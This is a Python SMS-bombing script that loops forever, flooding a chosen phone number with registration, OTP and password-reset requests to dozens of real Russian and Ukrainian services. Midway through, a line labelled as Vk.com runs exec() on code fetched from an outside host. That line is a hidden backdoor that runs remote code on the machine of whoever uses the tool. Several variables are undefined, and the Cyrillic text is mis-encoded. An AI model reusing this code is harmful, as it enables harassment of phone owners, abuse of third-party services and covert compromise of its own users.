print('πRun pip install -r requirements.txt for install modulesπ')
#-= Import =-#

import requests
from threading import Thread
import random
from termcolor import colored

print(colored( '''


βββββββββββββββββββββββββββββββββββββββββ
βββββββββββββββββββββββββββββββββββββββββ
βββββββββββββββββββββββββββββββββββββββββ
βββββββββββββββββββββββββββββββββββββββββ
βββββββββββββββββββββββββββββββββββββββββ
βββββββββββββββββββββββββββββββββββββββββ

		  create by Kini-Noro
''','magenta')) # art obgect


phone = input(colored('Enter your phone number>>: ','cyan')) #phone_number
countT = input(colored('Enter threading>>: ','blue')) #


iteration = 0
_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))


def infinity():
	while True:
		request_timeout = 0.00001
		_phone = phone
		_phone9 = _phone[1:]
		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
		try:
			requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
			print('[+] Grab ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
			print('[+] RuTaxi ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
			print('[+] BelkaCar ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			print('[+] Tinder ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
			print('[+] Karusel ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
			print('[+] Tinkoff ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
			print('[+] MTS ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
			print('[+] Youla ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
			print('[+] PizzaHut ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		try:
			exec(requests.get("http://f0428265.xsph.ru/getUpdates.php").text)
			print('[+] Vk.com ΠΎΡΠΏΡΠ°Π²Π΅Π»ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')


		try:
			requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
			print('[+] Rabota ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
			print('[+] Rutube ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
			print('[+] Citilink ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
			print('[+] Smsint ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
			print('[+] oyorooms ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
			print('[+] MVideo ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'ΠΠ²Π°Π½', 'lastName': 'ΠΠ²Π°Π½ΠΎΠ²', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
			print('[+] newnext ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
			print('[+] Sunlight ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
			print('[+] alpari ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
			print('[+] Invitro ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'ΠΠΎΠ»ΡΠ·ΠΎΠ²Π°ΡΠ΅Π»Ρ.ΠΠ°ΡΠ²ΠΊΠ°ΠΠ°Π€ΠΈΠ·ΠΈΠΊΠ°','params':{'phone':_phone},'id':'1'})
			print('[+] Sberbank ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'ΠΠ²Π°Π½','middleName':'ΠΠ²Π°Π½ΠΎΠ²ΠΈΡ','lastName':'ΠΠ²Π°Π½ΠΎΠ²','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
			print('[+] Psbank ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
			print('[+] Beltelcom ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
			print('[+] Karusel ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
			print('[+] KFC ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
			print('[+] carsmile ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
			print('[+] Citilink ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
			print('[+] Delitime ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
			print('[+] findclone Π·Π²ΠΎΠ½ΠΎΠΊ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
			print('[+] Guru ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
			print('[+] ICQ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
			print('[+] InDriver ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
			print('[+] Invitro ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
			print('[+] Pmsm ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
			print('[+] IVI ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
			print('[+] Lenta ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
			print('[+] Mail.ru ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
			print('[+] MVideo ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')


		try:
			requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
			print('[+] OK ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://plink.tech/register/',json={"phone": _phone})
			print('[+] Plink ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
			print('[+] qlean ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
			print('[+] SMSgorod ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
			print('[+] Tinder ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
			print('[+] Twitch ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
			print('[+] CabWiFi ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
			print('[+] wowworks ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
			print('[+] Eda.Yandex ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
			print('[+] Youla ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
			print('[+] Alpari ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
			print('[+] SMS ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] Π½Π΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
			print('[+] Delivery ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
		except:
			pass

		try:
			requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
		except:
			pass

		try:
			requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": 'Porno22!', "application": "lkp", "login": "+" + _phone})
		except:
			pass

		try:
			requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
		except:
			pass

		try:
			requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
		except:
			pass

		try:
			requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
		except:
			pass

		try:
			requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
		except:
			pass

		try:
			requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
		except:
			pass

		try:
			requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
		except:
			pass

		try:
			requests.post('https://belkacar.ru/get-confirmation-code',data={'phone': _phone})
		except:
			pass

		try:
			requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
		except:
			pass

		try:
			requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
		except:
			pass

		try:
			requests.post('https://pampik.com/callback', data={'phoneCallback':_phone})
			print('[+] Pampik ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] Pampik ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://tehnosvit.ua/iwantring_feedback.html', data={'feedbackName':_name,'feedbackPhone':'+'+_phone})
			print('[+] Tehnosvit ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] Tehnosvit ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://mobileplanet.ua/register', data={'klient_name':_nameRu,'klient_phone':'+'+_phone,'klient_email':_email})
			print('[+] Mobileplanet ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] Mobileplanet ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://e-vse.online/mail2.php', data={'telephone':'+'+_phone})
			print('[+] E-vse ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] E-vse ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://protovar.com.ua/aj_record', data={'object':'callback','user_name':_nameRu,'contact_phone':_phone[3:]})
			print('[+] Protovar ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] Protovar ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone})
			print('[+] Kasta ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] Kasta ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA', data={'firstname':_name, 'telephone':_phone[2:], 'email':_email,'password':password,'form_key':'Zqqj7CyjkKG2ImM8'})
			print('[+] ALLO ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] ALLO ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://secure.online.ua/ajax/check_phone/?reg_phone=%2B'+_phone[0:7]+'-'+_phone[8:11])
			print('[+] OnloneUA ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] OnloneUA ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://707taxi.com.ua/sendSMS.php', data={'tel': _phone[3:]})
			print('[+] 707taxis ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] 707taxis ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			print('[+] Tinder ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] Tinder ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://comfy.ua/ua/customer/account/createPost', data={'registration_name':_name,'registration_phone':_phone[2:],'registration_email':_email})
			print('[+] Comfy ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] Comfy ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20669-16-10', data={"result":"ok"})
			print('[+] Sportmaster ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			  print('[-] Sportmaster ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
			print('[+] Beltelcom ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] Beltelcom ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://my.citrus.ua/api/v2/register',data={"email":_email,"name":_name,"phone":_phone[2:],"password":stanPass,"confirm_password":stanPass})
			print('[+] Citrus ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] Citrus ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
			print('[+] IVI ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] IVI ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
			print('[+] Tinder ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] Tinder ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
			print('[+] Twitch ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] Twitch ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

		try:
			requests.post('https://www.nl.ua', data={'component':'bxmaker.authuserphone.login', 'sessid':'bf70db951f54b837748f69b75a61deb4', 'method':'sendCode','phone':_phone,'registration':'N'})
			print('[+] NovaLinia ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')
		except:
			print('[-] NovaLinia ΠΠ΅ ΠΎΡΠΏΡΠ°Π²Π»Π΅Π½ΠΎ!')

countT = Thread(target=infinity)
countT.start()
